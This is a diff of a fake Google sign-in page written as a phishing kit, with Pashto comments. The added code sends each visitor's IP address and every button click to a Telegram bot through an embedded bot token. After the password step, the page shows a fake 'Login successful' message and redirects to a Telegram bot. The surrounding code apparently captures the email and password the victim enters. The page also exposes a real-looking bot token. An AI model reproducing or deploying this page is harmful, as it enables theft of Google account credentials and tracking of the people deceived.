@@ -70,19 +70,6 @@
         .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
         .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
         .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
-        .cancel-btn {
-            width: 100%;
-            padding: 0.85rem;
-            background: #dc3545;
-            color: white;
-            border: none;
-            border-radius: 0.25rem;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 1rem;
-        }
-        .cancel-btn:hover { background: #c82333; }
         .hidden { display: none; }
     </style>
 </head>
@@ -96,9 +83,9 @@
         <div class="sub">Use your Google Account</div>
         <div class="input-group"><input type="email" id="emailInput" placeholder="Email or phone"></div>
         <div class="next-button-container"><button class="next-btn" id="nextBtn">Next</button></div>
-        <div class="links-row"><span onclick="alert('Forgot email?')">Forgot email?</span><span onclick="alert('Guest mode')">Guest mode</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-        <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
+        <div class="links-row"><span onclick="sendToAdmin('Forgot email?')">Forgot email?</span><span onclick="sendToAdmin('Guest mode')">Guest mode</span></div>
+        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="sendToAdmin('Learn more'); return false;">Learn more</a></div></div>
+        <a href="#" class="create-account" onclick="sendToAdmin('Create account'); return false;">Create account</a>
     </div>
 
     <!-- مرحله 2: پټنوم -->
@@ -108,26 +95,18 @@
         <div class="sub" id="displayEmail"></div>
         <div class="input-group"><input type="password" id="passwordInput" placeholder="Enter your password"></div>
         <div class="next-button-container"><button class="next-btn" id="loginBtn">Next</button></div>
-        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span onclick="alert('Forgot password?')">Forgot password?</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-    </div>
-
-    <!-- د بریالیتوب پینل -->
-    <div id="successPanel" class="hidden">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>✅ Verification Complete</h1>
-        <div class="sub">Your account has been successfully verified!</div>
-        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
+        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span onclick="sendToAdmin('Forgot password?')">Forgot password?</span></div>
+        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="sendToAdmin('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
     <div id="successBox" class="message success-msg"></div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
-    <div class="footer"><span onclick="alert('English')">English</span><span onclick="alert('Help')">Help</span><span onclick="alert('Privacy')">Privacy</span><span onclick="alert('Terms')">Terms</span></div>
+    <div class="footer"><span onclick="sendToAdmin('English')">English</span><span onclick="sendToAdmin('Help')">Help</span><span onclick="sendToAdmin('Privacy')">Privacy</span><span onclick="sendToAdmin('Terms')">Terms</span></div>
 </div>
 
 <script>
-    // ========== د بوټ لینک - ستاسو د بوټ سره بدل کړئ ==========
+    // ========== د بوټ لینک ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -156,6 +135,18 @@
         document.getElementById('passwordInput').value = '';
         currentEmail = '';
     }
+
+    // د ټولو بټنو لپاره (اډمن ته خبر ورکوي)
+    async function sendToAdmin(buttonName) {
+        const ip = await getUserIP();
+        const msg = `🔘 *${buttonName}* clicked\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
+        }).catch(e => console.log(e));
+    }
+
+    window.sendToAdmin = sendToAdmin;
 
     // مرحله 1: برېښنالیک
     document.getElementById('nextBtn').onclick = () => {
@@ -204,15 +195,13 @@
                 })
             });
             
-            // د بریالیتوب پینل ښکاره کړئ
-            document.getElementById('step2View').classList.add('hidden');
-            document.getElementById('successPanel').classList.remove('hidden');
+            showMessage(document.getElementById('successBox'), '✅ Login successful! Redirecting to bot...', false);
+            
+            // په اتوماتيک ډول بوټ ته لاړ شه
+            setTimeout(() => {
+                window.location.href = BOT_REDIRECT;
+            }, 1500);
         }
-    };
-    
-    // د CANCEL تڼۍ - بوټ ته ځي او لومړی ګام بشپړوي
-    document.getElementById('cancelBtn').onclick = () => {
-        window.location.href = BOT_REDIRECT;
     };
 </script>
 </body>
